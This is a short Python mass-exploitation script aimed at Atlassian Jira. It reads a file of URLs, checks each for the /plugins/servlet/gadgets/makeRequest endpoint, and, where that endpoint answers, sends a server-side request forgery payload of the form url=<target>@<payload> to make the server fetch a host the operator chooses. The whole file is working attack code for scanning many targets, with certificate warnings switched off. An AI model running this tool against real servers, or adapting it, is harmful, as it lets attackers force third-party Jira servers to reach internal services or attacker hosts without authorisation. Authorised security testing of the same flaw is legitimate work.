import requests
import argparse
import re
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description='')
parser.add_argument('--infile', help="File of urls to check (in format http(s)://example.com)", required=True)
parser.add_argument('--outfile', help="Where to save the results", required=True)
parser.add_argument('--payload', help="The payload to replace parameter values with", required=True)
args = parser.parse_args()

payload = args.payload
f = open(args.outfile, "a")

def send_get_request(link):
    """ sends a get request """
    try:
        response = requests.get(link)
        print("[+] Sent GET request to {}".format(link))
        f.write("Success\tGET\t{}\n".format(link))
   # except requests.exceptions.ConnectionError:
   #     print("[!] Failed GET request to: {}".format(link))
   #     f.write("Fail\tGET\t{}\n".format(link))
    except requests.exceptions.RequestException:
        print("[!] Failed GET request to: {}".format(link))
        response = None
    return response

def test_link(link):
    """ tests link and adds payload if successful """
    mod_link = link + "/plugins/servlet/gadgets/makeRequest"
    r = send_get_request(mod_link)
    if r is not None and r.status_code == 200:
        link = gen_payload(link)
        print("[+] JIRA apperas to exist! Sending payload to {}".format(link))
        send_get_request(link)

def gen_payload(link):
    """ adds payload """
    link = link + "/plugins/servlet/gadgets/makeRequest?url=" + link + "@" + payload
    return link

def main():
    urls = list()
    urls = [line.strip('\n') for line in open(args.infile, "r")]
    
    # gen list with new payloads in them
    for url in urls:
        test_link(url)

if __name__ == "__main__":
    main()
